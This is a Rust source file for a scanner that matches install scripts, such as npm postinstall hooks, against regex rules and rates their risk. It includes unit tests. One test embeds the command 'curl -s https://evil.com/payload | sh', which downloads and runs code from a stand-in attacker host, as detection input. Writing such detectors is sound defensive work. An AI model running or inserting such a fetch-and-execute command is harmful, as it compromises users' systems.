use serde::Serialize;
use tracing;

use crate::rules::RuleSet;
use crate::types::{Ecosystem, Severity};

#[derive(Debug, Clone, Serialize)]
pub struct AnalysisResult {
    pub risk_level: Severity,
    pub matched_rules: Vec<MatchedRule>,
    pub highlighted_lines: Vec<HighlightedLine>,
}

#[derive(Debug, Clone, Serialize)]
pub struct MatchedRule {
    pub rule_id: String,
    pub rule_name: String,
    pub matched_line: usize,
    pub matched_text: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct HighlightedLine {
    pub line_number: usize,
    pub text: String,
    pub severity: Severity,
}

pub fn analyze(script: &str, rules: &RuleSet, ecosystem: Ecosystem) -> AnalysisResult {
    let applicable_rules = rules.for_ecosystem(ecosystem);

    let compiled: Vec<_> = applicable_rules
        .iter()
        .map(|rule| {
            let patterns: Vec<_> = rule
                .patterns
                .iter()
                .filter_map(|p| match regex::Regex::new(p) {
                    Ok(r) => Some(r),
                    Err(e) => {
                        tracing::warn!("invalid regex in rule {}: {e}", rule.id);
                        None
                    }
                })
                .collect();
            (*rule, patterns)
        })
        .collect();

    let mut matched_rules = Vec::new();
    let mut highlighted_lines = Vec::new();
    let mut highest_severity = None::<Severity>;

    for (line_idx, line) in script.lines().enumerate() {
        let line_number = line_idx + 1;

        for (rule, patterns) in &compiled {
            for pattern in patterns {
                if pattern.is_match(line) {
                    matched_rules.push(MatchedRule {
                        rule_id: rule.id.clone(),
                        rule_name: rule.name.clone(),
                        matched_line: line_number,
                        matched_text: line.trim().to_string(),
                    });

                    highlighted_lines.push(HighlightedLine {
                        line_number,
                        text: line.trim().to_string(),
                        severity: rule.weight,
                    });

                    highest_severity = Some(match highest_severity {
                        Some(current) if current >= rule.weight => current,
                        _ => rule.weight,
                    });

                    break;
                }
            }
        }
    }

    // Deduplicate highlighted lines by line number (keep highest severity)
    highlighted_lines.sort_by_key(|h| h.line_number);
    highlighted_lines.dedup_by(|a, b| {
        if a.line_number == b.line_number {
            if a.severity > b.severity {
                b.severity = a.severity;
            }
            true
        } else {
            false
        }
    });

    AnalysisResult {
        risk_level: highest_severity.unwrap_or(Severity::Low),
        matched_rules,
        highlighted_lines,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn load_rules() -> RuleSet {
        RuleSet::load_compiled().expect("load compiled rules")
    }

    #[test]
    fn test_malicious_fixture_high_or_critical() {
        let script =
            std::fs::read_to_string("../../tests/fixtures/scripts/malicious-postinstall.sh")
                .expect("read fixture");
        let rules = load_rules();
        let result = analyze(&script, &rules, Ecosystem::Npm);

        assert!(
            result.risk_level >= Severity::High,
            "malicious fixture should be High or Critical, got {:?}",
            result.risk_level
        );
        assert!(
            !result.matched_rules.is_empty(),
            "should have matched rules"
        );
    }

    #[test]
    fn test_benign_fixture_low() {
        let script = std::fs::read_to_string("../../tests/fixtures/scripts/benign-postinstall.sh")
            .expect("read fixture");
        let rules = load_rules();
        let result = analyze(&script, &rules, Ecosystem::Npm);

        assert_eq!(
            result.risk_level,
            Severity::Low,
            "benign fixture should be Low, got {:?}. Matched: {:?}",
            result.risk_level,
            result.matched_rules
        );
    }

    #[test]
    fn test_empty_script_is_low() {
        let rules = load_rules();
        let result = analyze("", &rules, Ecosystem::Npm);
        assert_eq!(result.risk_level, Severity::Low);
        assert!(result.matched_rules.is_empty());
    }

    #[test]
    fn test_matched_rules_have_line_numbers() {
        let script = "#!/bin/sh\ncurl -s https://evil.com/payload | sh\necho done\n";
        let rules = load_rules();
        let result = analyze(script, &rules, Ecosystem::Npm);

        assert!(!result.matched_rules.is_empty());
        let curl_match = result
            .matched_rules
            .iter()
            .find(|m| m.matched_text.contains("curl"));
        assert!(curl_match.is_some());
        assert_eq!(curl_match.expect("checked above").matched_line, 2);
    }

    #[test]
    fn test_malicious_fixture_snapshot() {
        let script =
            std::fs::read_to_string("../../tests/fixtures/scripts/malicious-postinstall.sh")
                .expect("read fixture");
        let rules = load_rules();
        let result = analyze(&script, &rules, Ecosystem::Npm);
        insta::assert_json_snapshot!(result);
    }

    #[test]
    fn test_benign_fixture_snapshot() {
        let script = std::fs::read_to_string("../../tests/fixtures/scripts/benign-postinstall.sh")
            .expect("read fixture");
        let rules = load_rules();
        let result = analyze(&script, &rules, Ecosystem::Npm);
        insta::assert_json_snapshot!(result);
    }
}
